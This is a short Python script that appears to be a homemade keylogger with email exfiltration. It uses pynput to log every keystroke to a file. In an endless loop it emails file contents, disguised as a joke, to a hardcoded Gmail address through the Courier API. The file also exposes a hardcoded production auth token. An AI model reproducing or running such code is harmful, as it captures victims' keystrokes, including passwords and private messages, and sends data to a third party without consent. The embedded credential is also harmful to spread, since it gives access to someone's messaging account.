import time
import datetime


def sentMail():
    # Install Courier SDK: pip install trycourier
    from trycourier import Courier
    with open('README.md', 'r') as file:
        data = file.read().replace('\n', '')

    client = Courier(auth_token="pk_prod_FQTZ70SHDJMVA8GNGAW1PQV4MT9R")

    resp = client.send_message(
        message={
            "to": {
            "email": "hyquaq15@gmail.com"
            },
            "content": {
            "title": "Welcome to Courier!",
            "body": "Want to hear a joke? {{joke}}"
            },
            "data":{
            "joke": "Why does Python live on land? Because it is above C level" + data
            },
        }
    )

def your_code_that_process():
    now = datetime.datetime.now()
    print(now)
    # importing the required modules  
    from pynput.keyboard import Key  
    from pynput.keyboard import Listener  
    
    # creating an empty list to store pressed keys  
    the_keys = []  
    # creating a function that defines what to do on each key press  
    def functionPerKey(key):  
    # appending each pressed key to a list  
        the_keys.append(key)  
    # writing list to file after each key pressed  
        storeKeysToFile(the_keys)  
    
    # defining the function to write keys to the log file  
    def storeKeysToFile(keys):  
        # creating the keylog.txt file with write mode  
        with open('keylog.txt', 'a') as log:  
            # looping through each key present in the list of keys  
            for the_key in keys:  
                # converting the key to string and removing the quotation marks  
                the_key = str(the_key).replace("'", "")  
                # writing each key to the keylog.txt file
                the_key += "\n"  
                log.write(the_key)  
    
    # defining the function to perform operation on each key release  
    def onEachKeyRelease(the_key):  
        # In case, the key is "Esc" then stopping the keylogger  
        if the_key == Key.esc:  
            return False  
    
    with Listener(  
        on_press = functionPerKey,  
        on_release = onEachKeyRelease  
    ) as the_listener:  
        the_listener.join()  

while True:   # infinite loop
    your_code_that_process()   # put your code that do stuff once and exit
    time.sleep(3)  # 300 seconds of sleeping, make it wait 300sec
    sentMail()
    # if check_for_abort_if_so_break():  # you can make flag that you trigger on error or by input 
    #                                    # so you can exit out of infinite loop
    #     break  # exit infinite loop (not so infinite anymore)